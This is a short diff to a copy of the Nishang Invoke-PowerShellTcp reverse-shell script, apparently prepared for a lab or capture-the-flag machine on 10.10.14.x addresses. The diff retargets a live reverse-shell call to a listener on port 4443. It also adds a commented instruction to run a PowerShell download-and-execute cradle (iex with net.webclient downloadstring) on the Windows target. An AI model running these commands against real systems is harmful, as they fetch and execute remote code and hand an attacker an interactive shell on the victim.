@@ -124,7 +124,7 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4443
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.32 -Port 4443
 
-
-powershell iex(new-object net.webclient).downloadstring('http://10.10.14.30:8000/Invoke-PowerShellTcp.ps1')
+# Run htis command on the windows target 
+# powershell iex(new-object net.webclient).downloadstring('http://10.10.14.32:8000/Invoke-PowerShellTcp.ps1')
